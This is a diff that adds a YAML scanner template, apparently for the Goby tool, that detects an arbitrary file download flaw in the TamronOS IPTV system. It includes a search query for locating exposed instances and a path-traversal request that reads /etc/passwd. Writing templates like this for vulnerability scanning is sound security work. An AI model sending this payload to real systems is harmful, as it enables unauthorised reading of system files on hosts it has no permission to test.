@@ -1,0 +1,17 @@
+name: TamronOS IPTV系统后台任意文件下载
+manual: true
+query: title="TamronOS IPTV系统"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /download/backup?name=../../../../../../../../etc/passwd
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  description: 扫描时最好使用全端口扫描，系统部署的端口很分散
